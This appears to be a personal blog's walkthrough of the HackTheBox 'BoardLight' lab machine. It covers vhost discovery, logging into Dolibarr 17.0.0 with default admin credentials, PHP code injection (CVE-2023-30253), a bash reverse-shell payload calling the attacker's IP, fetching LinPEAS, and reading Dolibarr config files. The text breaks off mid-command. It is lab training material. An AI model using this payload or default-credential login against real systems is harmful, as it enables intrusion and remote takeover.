<!doctype html><html lang=en><head><title>HTB BoardLight WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'BoardLight' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB BoardLight WriteUp"><meta name=twitter:description content="HackThebox 'BoardLight' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/boardlight/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB BoardLight WriteUp"><meta property="og:description" content="HackThebox 'BoardLight' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-28T00:00:00+00:00"><meta property="article:modified_time" content="2024-09-28T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Ffuf"><meta property="article:tag" content="Vhost"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/boardlight/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/boardlight/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/boardlight/>HTB BoardLight WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-09-28T00:00:00Z>28 September, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
9-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/windows/>Windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/ffuf/>Ffuf</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/vhost/>Vhost</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/dolibarr/>Dolibarr</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/suid/>Suid</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/enlightment/>Enlightment</a></span></div></div></header><div class=post-content><h1 id=boardlight----hackthebox>BoardLight &ndash; HackTheBox
<a class=heading-link href=#boardlight----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Easy</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;BoardLight&rsquo; Avatar" src=/pentesting/images/BoardLight_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>BoardLight</code> is an easy box/machine from <code>HackTheBox</code> platform. After inspecting the main webpage of the victim machine, we note it is <code>vhosting</code> a subdomain. This subdomain is running <code>Dolibarr</code> with default credentials. Once in, we are able to exploit the vulnerability <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30253" class=external-link target=_blank rel=noopener>CVE-2023-30253</a> and gain initial access to the victim machine. We are also able to find credentials for this service that are the same as another user in the system. Finally, we check for <code>SUID</code> files. One of them is <code>Enlightment</code> (a windows manager). Abusing this service with the vulnerability labeled as <a href=https://nvd.nist.gov/vuln/detail/CVE-2022-37706 class=external-link target=_blank rel=noopener>CVE-2022-37706</a> we are able to become <code>root</code> user and gain total control of the system.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Starting with <code>Nmap</code> scan shows only 2 ports open: <code>22</code> <code>SSH</code> and <code>80</code> <code>HTTP</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80 10.10.11.11 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-01 22:31 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.11
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.18s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
</span></span></span><span class=line><span class=cl><span class=go>|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds
</span></span></span></code></pre></div><p>Since port <code>80</code> <code>HTTP</code> is open, we visit <code>http://10.10.11.11</code>. We can see the following webpage there:</p><p><img alt="BoardLight 1" src=/pentesting/images/BoardLight_1.png></p><p>In short, the page offers an IT service. Buttons in this page work and redirect to <code>.php</code> files (so this server is using <code>PHP</code>). None of the buttons returns something interesting. So I will start searching for subdomains. I note that at the bottom of the page I can see a contact <code>info@board.htb</code>. So I assume the domain is <code>board.htb</code>. I add this domain to my <code>/etc/hosts</code> file running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.11 board.htb&#39; | sudo tee -a /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.11 board.htb
</span></span></span></code></pre></div><p>Then, start searching for <code>vhosts</code> with <code>ffuf</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://board.htb/ -H &#39;Host: FUZZ.board.htb&#39; -fs 15949
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : http://board.htb/
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Header           : Host: FUZZ.board.htb
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 40
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go> :: Filter           : Response size: 15949
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 265ms]
</span></span></span><span class=line><span class=cl><span class=go>:: Progress: [4989/4989] :: Job [1/1] :: 231 req/sec :: Duration: [0:00:21] :: Errors: 0 ::
</span></span></span></code></pre></div><p>where we get a new domain: <code>crm.board.htb</code></p><p>I add this new domain to my <code>/etc/hosts</code> file, so this file now looks like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ tail -n 1 /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.11 board.htb crm.board.htb
</span></span></span></code></pre></div><p>Once added this new <code>vhost</code>, visit it at <code>http://crm.board.htb</code>. We have a login panel:</p><p><img alt="BoardLight 2" src=/pentesting/images/BoardLight_2.png></p><p>where I can see it is using <code>Dolibarr</code> software; more specifically its version <code>17.0.0</code>.</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content><code>Dolibarr</code> ERP CRM is an open source, free software package for companies of any size, foundations or freelancers. It includes different features for enterprise resource planning (<code>ERP</code>) and customer relationship management (<code>CRM</code>) but also other features for different activities.</div></div><p>Searching <code>dolibarr 17.0.0 exploit</code> leads us to the following <a href=https://www.swascan.com/security-advisory-dolibarr-17-0-0/ class=external-link target=_blank rel=noopener>Swascan post</a> where they provide, step by step, how to exploit a vulnerability that allows <code>PHP</code> <code>Code Injection</code> labeled as <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30253" class=external-link target=_blank rel=noopener>CVE-2023-30253</a>. But it needs a user. From <a href=https://github.com/Dolibarr/dolibarr/issues/6568 class=external-link target=_blank rel=noopener>Dolibarr Github repository</a> it says that they should be <code>admin:admin</code>. I try with these credentials and they work&mldr;</p><p><img alt="BoardLight 3" src=/pentesting/images/BoardLight_3.png></p><p>Now I will just start following the instructions from <a href=https://www.swascan.com/security-advisory-dolibarr-17-0-0/ class=external-link target=_blank rel=noopener>Swascan post</a>. I click, at the top left side, on <code>Websites</code> and click on <code>+</code> symbol. Then add a simple page. In my case I just filled with:</p><p><img alt="BoardLight 4" src=/pentesting/images/BoardLight_4.png></p><p>and click on <code>Create</code>.</p><p>The site should be there. Now just edit it clicking on <code>+</code> at the side of <code>Page</code> and add a page. I add a generic <code>HTML</code> header like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl> <span class=p>&lt;</span><span class=nt>article</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>header</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>A heading here<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>Posted by John Doe<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>Some additional information here<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>header</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>Lorem Ipsum dolor set amet....<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>article</span><span class=p>&gt;</span> 
</span></span></code></pre></div><p>and create it. Now we should see:</p><p><img alt="BoardLight 6" src=/pentesting/images/BoardLight_6.png></p><p>Click on <code>Edit HTML Source</code> and add the code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!-- Enter here your HTML content. Add a section with an id tag and tag contenteditable=&#34;true&#34; if you want to use the inline editor for the content  --&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>section</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;mysection1&#34;</span> <span class=na>contenteditable</span><span class=o>=</span><span class=s>&#34;true&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=cp>&lt;?PHP echo 2+2; ?&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>section</span><span class=p>&gt;</span>
</span></span></code></pre></div><p><img alt="BoardLight 7" src=/pentesting/images/BoardLight_7.png></p><p>And, just as the post explained, we can see <code>4</code> in the page. This means that the code has been executed:</p><p><img alt="BoardLight 8" src=/pentesting/images/BoardLight_8.png></p><p>So it injected the code. Therefore, I repeat the steps but now in the page I will put the payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!-- Enter here your HTML content. Add a section with an id tag and tag contenteditable=&#34;true&#34; if you want to use the inline editor for the content  --&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>section</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;mysection1&#34;</span> <span class=na>contenteditable</span><span class=o>=</span><span class=s>&#34;true&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=cp>&lt;?PhP system(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.16.6/443 0&gt;&amp;1&#34;&#39;); ?&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>section</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>where <code>10.10.16.6</code> is my attacker IP and <code>443</code> is the port I will start a listener to get a shell.</p><p><img alt="BoardLight 9" src=/pentesting/images/BoardLight_9.png></p><p>Before clicking on <code>Save</code>, I start a listener with <code>netcat</code> on port <code>443</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span></code></pre></div><p>After clicking on save I get a shell as <code>www-data</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.11] 45952
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (855): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>www-data@boardlight:~/html/crm.board.htb/htdocs/website$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>www-data
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>www-data@boardlight:~/html/crm.board.htb/htdocs/website$
</span></span></span></code></pre></div><p>Once inside, I can see one user at <code>/home</code> called <code>larissa</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@boardlight:~/html/crm.board.htb/htdocs/website$ ls /home
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>larissa
</span></span></span></code></pre></div><p>I will upload <code>LinPEAS</code> to the target machine. First, I download it from my attacker machine, assign to it execution permissions and expose <code>linpeas.sh</code> in a temporal <code>Python</code> <code>HTTP</code> server on port <code>8080</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wget https://github.com/peass-ng/PEASS-ng/releases/download/20240526-eac1a3fa/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ chmod +x ./linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ls &amp;&amp; python3 -m http.server 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
</span></span></span></code></pre></div><p>and download it, running in the victim machine, <code>wget</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@boardlight:~/html/crm.board.htb/htdocs/website$ wget http://10.10.16.6:8080/linpeas.sh -O /tmp/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--2024-06-01 20:46:01--  http://10.10.16.6:8080/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go>Connecting to 10.10.16.6:8080... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 862779 (843K) [text/x-sh]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: &#39;/tmp/linpeas.sh&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/tmp/linpeas.sh                            100%[=======================================================================================&gt;] 842.56K   795KB/s    in 1.1s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024-06-01 20:46:03 (795 KB/s) - &#39;/tmp/linpeas.sh&#39; saved [862779/862779]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>www-data@boardlight:~/html/crm.board.htb/htdocs/website$ chmod +x /tmp/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>www-data@boardlight:~/html/crm.board.htb/htdocs/website$ /tmp/linpeas.sh
</span></span></span></code></pre></div><p>After running it I note that there is a file that has been detected as a &ldquo;backup&rdquo; and is located at <code>crm.board.htb</code> directory (the directory we are currently in)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Backup files (limited 100)
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 root root 225 Aug 19  2021 /var/lib/sgml-base/supercatalog.old
</span></span></span><span class=line><span class=cl><span class=go>-r-------- 1 www-data www-data 16394 May 13 13:20 /var/www/html/crm.board.htb/htdocs/conf/conf.php.old
</span></span></span><span class=line><span class=cl><span class=go>-rw-rw-r-- 1 www-data www-data 2049 Jun  1 19:25 /var/www/html/crm.board.htb/documents/website/19d1d9a067/page7.tpl.php.old
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Checking its content (and removing comments and empty lines with <code>grep</code>) we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@boardlight:~/html/crm.board.htb/htdocs/website$ cat /var/www/html/crm.board.htb/htdocs/conf/conf.php.old | grep -v &#34;^\/\/&#34; | grep -v &#39;^$&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;?php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span><span class=nv>dolibarr_main_url_root</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_document_root</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_data_root</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_host</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_port</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_name</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_user</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_pass</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_type</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_character_set</span><span class=o>=</span><span class=s1>&#39;utf8&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_collation</span><span class=o>=</span><span class=s1>&#39;utf8_unicode_ci&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_readonly</span><span class=o>=</span>0<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_instance_unique_id</span><span class=o>=</span><span class=s1>&#39;84b5bc91f83b56e458db71e0adac2b62&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_authentication</span><span class=o>=</span><span class=s1>&#39;dolibarr&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_force_https</span><span class=o>=</span><span class=s1>&#39;0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_prod</span><span class=o>=</span><span class=s1>&#39;1&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_restrict_os_commands</span><span class=o>=</span><span class=s1>&#39;mysqldump, mysql, pg_dump, pgrestore&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_restrict_ip</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_nocsrfcheck</span><span class=o>=</span><span class=s1>&#39;0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_cron_allow_cli</span><span class=o>=</span><span class=s1>&#39;0&#39;</span><span class=p>;</span>
</span></span></code></pre></div><p>It&rsquo;s empty.</p><p>However, if I check the original file (with comments) I can see something:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@boardlight:~/html/crm.board.htb/htdocs/website$ cat /var/www/html/crm.board.htb/htdocs/conf/conf.php.old
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>// dolibarr_main_db_pass
</span></span></span><span class=line><span class=cl><span class=go>// =====================
</span></span></span><span class=line><span class=cl><span class=go>// This parameter contains password used to read and write into Dolibarr database.
</span></span></span><span class=line><span class=cl><span class=go>//
</span></span></span><span class=line><span class=cl><span class=go>// Examples:
</span></span></span><span class=line><span class=cl><span class=go>// $dolibarr_main_db_pass=&#39;myadminpass&#39;;
</span></span></span><span class=line><span class=cl><span class=go>// $dolibarr_main_db_pass=&#39;myuserpassword&#39;;
</span></span></span><span class=line><span class=cl><span class=go>//
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>so it is kind of a &ldquo;template&rdquo; to store credentials for a database.</p><p>Maybe there&rsquo;s a <code>conf.php</code> file based on this &ldquo;template&rdquo;. Using <code>find</code> we search if there is a file called <code>conf.php</code> on the machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@boardlight:~/html/crm.board.htb/htdocs/website$ find / -name &#34;*conf.php&#34; 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/var/www/html/crm.board.htb/htdocs/install/fileconf.php
</span></span></span><span class=line><span class=cl><span class=go>/var/www/html/crm.board.htb/htdocs/conf/conf.php
</span></span></span></code></pre></div><p>Checking <code>/var/www/html/crm.board.htb/htdocs/conf/conf.php</code> returns something interesting:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@boardlight:~/html/crm.board.htb/htdocs/website$ cat /var/www/html/crm.board.htb/htdocs/conf/conf.php | grep -vE &#34;^\/\/|^$&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;?php
